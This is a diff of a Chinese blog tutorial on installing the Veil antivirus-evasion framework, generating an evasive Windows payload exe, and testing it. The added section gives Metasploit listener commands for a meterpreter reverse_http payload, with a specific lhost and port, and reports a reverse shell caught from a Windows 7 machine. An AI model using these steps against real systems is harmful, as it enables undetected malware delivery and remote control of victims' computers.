@@ -119,7 +119,8 @@
 <meta property="og:image" content="/images/Veil3.1免杀安装/8.PNG">
 <meta property="og:image" content="/images/Veil3.1免杀安装/9.PNG">
 <meta property="og:image" content="/images/Veil3.1免杀安装/10.PNG">
-<meta property="og:updated_time" content="2018-03-23T06:32:08.524Z">
+<meta property="og:image" content="/images/Veil3.1免杀安装/11.PNG">
+<meta property="og:updated_time" content="2018-03-23T06:41:32.800Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Veil3.1免杀安装">
 <meta name="twitter:description" content="听说很难安装。 准备工作下载最新3.1版本的VeilGithub：https://github.com/Veil-Framework/Veil.git 配置环境安装之前先更新一下包，执行命令apt-get update下载配置Veil所需的包，不然会报错，在终端输入：apt-get install libncurses5*apt-get install libavutil55*apt-get in">
@@ -444,7 +445,7 @@
 <p>紧接着，一直疯狂的按<code>next</code>，让它安装。<br><img src="/images/Veil3.1免杀安装/3.PNG" alt=""><br>这里就不一一截图了。</p>
 <p>看到这步点击<code>finish</code>了,然后继续安装。<br><img src="/images/Veil3.1免杀安装/4.PNG" alt=""><br>安装成功<br><img src="/images/Veil3.1免杀安装/5.PNG" alt=""></p>
 <h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>在<code>Veil-master</code>文件夹下终端输入<code>./Veil.py</code>运行<br><img src="/images/Veil3.1免杀安装/6.PNG" alt=""><br>输入<code>use 1</code>然后 <code>list</code>查看<code>payload</code><br><img src="/images/Veil3.1免杀安装/7.PNG" alt=""><br>这里测试生成个<code>exe</code><br><code>use 5</code>，然后输入IP地址和端口<br><img src="/images/Veil3.1免杀安装/8.PNG" alt=""><br>这里输入要生成的文件名<br><img src="/images/Veil3.1免杀安装/9.PNG" alt=""><br>生成成功<br><img src="/images/Veil3.1免杀安装/10.PNG" alt=""></p>
-<p>整个过程大致就这样，下次见。</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>将生成的<code>exe</code>丢进<code>win7</code>运行，然后<code>kali运行msf开启监听</code><br><code>set payload windows/meterpreter/reverse_http</code><br><code>set lhost 192.11.22.64</code><br><code>set lport 8888</code><br><code>run</code><br>成功反弹<code>shell</code><br><img src="/images/Veil3.1免杀安装/11.PNG" alt=""><br>整个过程大致就这样，下次见。</p>
 
       
     </div>
@@ -691,7 +692,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#准备工作"><span class="nav-number">1.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置环境"><span class="nav-number">2.</span> <span class="nav-text">配置环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装"><span class="nav-number">3.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#运行"><span class="nav-number">4.</span> <span class="nav-text">运行</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#准备工作"><span class="nav-number">1.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置环境"><span class="nav-number">2.</span> <span class="nav-text">配置环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装"><span class="nav-number">3.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#运行"><span class="nav-number">4.</span> <span class="nav-text">运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-number">5.</span> <span class="nav-text">测试</span></a></li></ol></div>
             
 
           </div>
